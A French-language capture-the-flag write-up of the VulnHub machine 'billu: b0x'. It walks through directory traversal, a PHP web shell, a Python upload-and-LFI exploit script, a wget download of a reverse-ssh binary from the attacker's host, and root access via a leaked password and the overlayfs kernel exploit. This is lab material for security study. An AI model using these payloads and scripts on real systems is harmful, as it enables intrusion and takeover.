---
title: "Solution du CTF billu: b0x 1 de VulnHub"
tags: [CTF, VulnHub]
---

[billu: b0x](https://vulnhub.com/entry/billu-b0x,188/) était un CTF assez intéressant centré sur de l'exploitation web.

# 1 impasse de la faille, 31337 Injection

```
Nmap scan report for 192.168.56.198
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:5.9p1: 
|       SSV:60656       5.0     https://vulners.com/seebug/SSV:60656    *EXPLOIT*
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107
|       SSV:90447       4.6     https://vulners.com/seebug/SSV:90447    *EXPLOIT*
|       CVE-2016-0778   4.6     https://vulners.com/cve/CVE-2016-0778
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|_      CVE-2016-0777   4.0     https://vulners.com/cve/CVE-2016-0777
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /test.php: Test page
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
```

Sur le port 80 on trouve une mire de login avec un message nous incitant à exploiter une faille SQL.

J'ai d'abord tenté d'injecter apostrophes et guillemets pour voir si un message d'erreur apparaissait puis j'ai tenté quelques techniques de bypass de l'authentification :

```
admin' or '1'='1
admin" or "1"="1
admin" or 1 #
admin' or 1 #
```

Ni `Wapiti` ni `sqlmap` ne trouvaient de vulnérabilités, j'ai donc décidé de chercher ailleurs.

Ailleurs, c'est le script `test.php` qu'on peut voit dans l'output de Nmap. Cette page retourne le message suivant :

> 'file' parameter is empty. Please provide file path in 'file' parameter

Passer le paramètre via l'URL ne semble avoir aucun effet, mais en le passant par `POST` on obtient une faille de directory traversal :

```console
$ curl http://192.168.56.198/test.php -XPOST --data "file=/etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:106::/var/run/dbus:/bin/false
whoopsie:x:104:107::/nonexistent:/bin/false
landscape:x:105:110::/var/lib/landscape:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
ica:x:1000:1000:ica,,,:/home/ica:/bin/bash
```

Prochaine étape : déterminer si on est présence d'une faille d'inclusion ou pas.

Passer une URL http au paramètre `file` semble échouer, mais apparemment il tente quelque chose quand il s'agit d'une URL ftp.

J'ai lancé un serveur FTP de cette façon :

```bash
python3 -m pyftpdlib -p 9999 -r 7777-7777 -D
```

Ici, il écoute sur le port 9999 et le transfert de données doit se faire via le port 7777.

Malheureusement quand je déclenche la récupération du fichier j'obtiens le code PHP et non son interprétation :

```console
$ curl http://192.168.56.198/test.php -XPOST --data "file=ftp://192.168.56.1:9999/shell.php&cmd=id"
<?php system($_POST["cmd"]); ?>
```

## White b0xxx

Je vais jeter un œil au code PHP de la page de login. Pour cela je récupère le fichier `/etc/apache2/sites-enabled/000-default`.

Je trouve ainsi le path de la racine web :

`DocumentRoot /var/www`

Voici le code de la page d'index (et de login) :

```php
<?php
session_start();

include('c.php');
include('head.php');
if(@$_SESSION['logged']!=true) {
    $_SESSION['logged']='';
}

if($_SESSION['logged']==true &&  $_SESSION['admin']!='') {
    echo "you are logged in :)";
    header('Location: panel.php', true, 302);
} else {
    echo '<div align=center style="margin:30px 0px 0px 0px;">
    <font size=8 face="comic sans ms">--==[[ billu b0x ]]==--</font> 
    <br><br>
    Show me your SQLI skills <br>
    <form method=post>
    Username :- <Input type=text name=un> &nbsp Password:- <input type=password name=ps> <br><br>
    <input type=submit name=login value="let\'s login">';
}

if(isset($_POST['login'])) {
    $uname = str_replace('\'','',urldecode($_POST['un']));
    $pass = str_replace('\'','',urldecode($_POST['ps']));
    $run = 'select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
    $result = mysqli_query($conn, $run);

    if (mysqli_num_rows($result) > 0) {
        $row = mysqli_fetch_assoc($result);
        echo "You are allowed<br>";
        $_SESSION['logged']=true;
        $_SESSION['admin']=$row['username'];
           
        header('Location: panel.php', true, 302);
   
    } else {
        echo "<script>alert('Try again');</script>";
    }
}
echo "<font size=5 face=\"comic sans ms\" style=\"left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\">B0X Powered By <font color=#ff9933>Pirates</font> ";
?>
```

On voit que les valeurs passées à la requête sont dépouillées du caractère apostrophe puis placées entre apostrophes ce qui rend l'exploitation impossible.

Voici le contenu de `c.php` qui contient l'authentification sur la base de données :

```php
<?php
#header( 'Z-Powered-By:its chutiyapa xD' );
header('X-Frame-Options: SAMEORIGIN');
header( 'Server:testing only' );
header( 'X-Powered-By:testing only' );

ini_set( 'session.cookie_httponly', 1 );

$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");

// Check connection
if (mysqli_connect_errno()) {
    echo "connection failed ->  " . mysqli_connect_error();
}

?>
```

Via une énumération web je trouve le dossier `/phpmy/` à la racine correspondant à un *phpMyAdmin*.

Je peux alors me connecter dessus et lire le contenu de la base `auth` :

| id  | uname | pass   |
| --- | ----- | ------ |
| 1   | biLLu | hEx_it |

Pour avoir une meilleure compréhension de ce que la section admin offre je dump le fichier `panel.php` :

```php
<select name=load>
    <option value="show">Show Users</option>
        <option value="add">Add User</option>
</select> 

<?php
if (isset($_POST['continue'])) {
    $dir = getcwd();
    $choice = str_replace('./','',$_POST['load']);

    if ($choice === 'add') {
        include($dir.'/'.$choice.'.php');
        die();
    }

    if ($choice === 'show') {
        include($dir.'/'.$choice.'.php');
        die();
    } else {
        include($dir.'/'.$_POST['load']);
    }
}

if (isset($_POST['upload'])) {
    $name = mysqli_real_escape_string($conn,$_POST['name']);
    $address = mysqli_real_escape_string($conn,$_POST['address']);
    $id = mysqli_real_escape_string($conn,$_POST['id']);

    if (!empty($_FILES['image']['name'])) {
       $iname = mysqli_real_escape_string($conn,$_FILES['image']['name']);
       $r = pathinfo($_FILES['image']['name'],PATHINFO_EXTENSION);
       $image = array('jpeg','jpg','gif','png');
       if (in_array($r, $image)) {
           $finfo = @new finfo(FILEINFO_MIME); 
           $filetype = @$finfo->file($_FILES['image']['tmp_name']);
           if (preg_match('/image\/jpeg/', $filetype )  || preg_match('/image\/png/', $filetype ) || preg_match('/image\/gif/', $filetype )) {
               if (move_uploaded_file($_FILES['image']['tmp_name'], 'uploaded_images/'.$_FILES['image']['name'])) {
                   echo "Uploaded successfully ";
                   $update = 'insert into users (name, address, image, id) values(\''.$name.'\', \''.$address.'\', \''.$iname.'\', \''.$id.'\')'; 
                   mysqli_query($conn, $update);
               }
           } else {
               echo "<br>i told you dear, only png,jpg and gif file are allowed";
           }
       } else {
           echo "<br>only png,jpg and gif file are allowed";
       }
    }
}
```

Ce fichier est intéressant. On voit que si la variable `continue` est définie alors on peut provoquer une LFI via le paramètre `load`.

Deuxièmement on peut uploader un fichier. Le type mime est vérifié, mais on peut tout à fait passer cette vérification en plaçant un entête de fichier PNG.

En revanche l'extension doit faire partie d'une whitelist qu'on ne peut pas bypasser.

Le principe d'exploitation est le suivant : on se connecte, on uploade un fichier contenant du code PHP (mais avec un header PNG et extension `.png`) puis on l'inclut via le paramètre `load`.

J'ai écrit le code Python suivant qui automatise l'exploitation :

```python
import requests

filename = "myshell.png"

session = requests.Session()
response = session.post(
    "http://192.168.56.198/index.php",
    data={
        "un": "biLLu", 
        "ps": "hEx_it",
        "login": "let's login",
    }
)

if "Try again" in response.text:
    print("Auth failed")
    exit()

response = session.post(
    "http://192.168.56.198/panel.php",
    data={
        "upload": "whatever",
    },
    files={
        "image": (filename, b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00<?php system($_POST["cmd"]); ?>\n')
    }
)
if "only png,jpg and gif file are allowed" in response.text:
    print("Upload failed")
    exit()

while True:
    command = input("$ ").strip()
    response = session.post(
        "http://192.168.56.198/panel.php",
        data={
            "continue": "whatever",
            "load": f"uploaded_images/{filename}",
            "cmd": command,
        }
    )
    output = response.text.split("IHDR\x00")[1].strip()
    print(output)
```

Je peux alors rapatrier un `reverse-ssh` et l'exécuter en mode bind (port par défaut 31337) :

```console
devloop@linux:~> python upload.py 
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ pwd
/var/www
$ ls -al
total 56
drwxr-xr-x  5 root root 4096 Mar 20  2017 .
drwxr-xr-x 13 root root 4096 Mar 29  2017 ..
-rw-r--r--  1 root root  330 Mar 20  2017 add.php
-rw-r--r--  1 root root  391 Mar 20  2017 c.php
-rw-r--r--  1 root root 2822 Mar 20  2017 head.php
-rw-r--r--  1 root root 2491 Mar 20  2017 head2.php
drwxr-xr-x  2 root root 4096 Mar 20  2017 images
-rw-r--r--  1 root root   22 Mar 19  2017 in.php
-rw-r--r--  1 root root 1314 Mar 20  2017 index.php
-rw-r--r--  1 root root 2167 Mar 20  2017 panel.php
drwxrwxr-x 10 ica  ica  4096 Mar 20  2017 phpmy
-rw-r--r--  1 root root  596 Mar 20  2017 show.php
-rw-r--r--  1 root root  824 Mar 20  2017 test.php
drwxrwxrwx  2 root root 4096 May 14 01:28 uploaded_images
$ uname -a                                  
Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
$ wget http://192.168.56.1:9999/reverse-sshx86 -O uploaded_images/reverse-sshx86
$ chmod 755 uploaded_images/reverse-sshx86
$ nohup uploaded_images/reverse-sshx86 &
```

## roottoor vers le futur

En fouillant sur la VM les fichiers appartenant au seul utilisateur *non-système* présent je trouve une particularité :

```
146807   44 -rwxr-xr-x   1 ica      ica         41284 Mar 19  2017 /usr/bin/passwd
```

On ne pourra pas changer le mot de passe des comptes à moins d'être root car le binaire n'a pas son bit setuid.

LinPEAS fouille dans les scripts PHP présents sur le disque et nous remonte un mot de passe :

```
╔══════════╣ Searching passwords in config PHP files
$cfg['Servers'][$i]['AllowNoPassword'] = true;
$cfg['Servers'][$i]['password'] = 'roottoor';
$cfg['Servers'][$i]['AllowNoPassword'] = false;
$cfg['Servers'][$i]['AllowNoPassword'] = false;
$cfg['Servers'][$i]['nopassword'] = false;
$cfg['ShowChgPassword'] = true;
```

Il correspond à l'installation du *phpMyAdmin*, dans `/phpmy/config.inc.php`.

Ce mot de passe permet de passer root via `su`.

On peut aussi exploiter la faille `overlayfs` qui n'est pas spécifique à une architecture :

[Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation - Linux local Exploit](https://www.exploit-db.com/exploits/37292)

```console
www-data@indishell:/tmp$ gcc -o overflayfs overflayfs.c 
www-data@indishell:/tmp$ ./overflayfs 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```
